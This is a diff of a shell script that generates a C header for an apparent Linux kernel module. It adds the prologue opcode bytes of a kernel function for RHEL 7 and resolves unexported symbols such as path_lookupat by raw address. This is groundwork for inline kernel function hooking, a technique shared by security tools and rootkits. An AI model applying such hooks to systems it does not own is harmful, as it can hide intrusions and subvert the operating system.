@@ -56,6 +56,9 @@ if  [ -e $SM ] ; then
         echo '#elif LINUX_VERSION_CODE == KERNEL_VERSION(2,6,32) && RHEL_MAJOR == 6' >> $INC
         echo "#define LENGTH    0x1f" >> $INC
         echo 'unsigned char opcode[] =   "\x55\x48\x89\xe5\x48\x81\xec\xb0\x00\x00\x00\x48\x89\x5d\xd8\x4c\x89\x65\xe0\x4c\x89\x6d\xe8\x4c\x89\x75\xf0\x4c\x89\x7d\xf8";' >> $INC
+        echo '#elif LINUX_VERSION_CODE == KERNEL_VERSION(3,10,0) && RHEL_MAJOR == 7' >> $INC
+        echo "#define LENGTH    0x19" >> $INC
+        echo 'unsigned char opcode[] =   "\x0f\x1f\x44\x00\x00\x55\x48\x89\xe5\x41\x57\x41\x56\x41\x55\x49\x89\xfd\x41\x54\x53\x48\x83\xec\x28";' >> $INC
         echo '#endif' >> $INC
       else
         echo '#if LINUX_VERSION_CODE == KERNEL_VERSION(2,6,18) && RHEL_MAJOR == 5' >> $INC
@@ -94,10 +97,5 @@ if  [ -e $SM ] ; then
   echo "int (*path_lookupat_p)(int, const char *, unsigned int, struct nameidata *)=(void *)0x$PATH_LOOKUPAT;" >>$INC;
   echo "#endif" >>$INC;
 
-  
-  echo "#ifndef HAS_PROC_DIR_ENTRY_DEF" >> $INC;
-  PROC_INTERNAL_H=./proc_internal.h
-  sed -e 's/proc_dir_entry/proc_dir_entry_t/' -ne '/^struct proc_dir_entry/,/};/p' $PROC_INTERNAL_H >> $INC
-  echo "#endif" >>$INC;
 
 fi
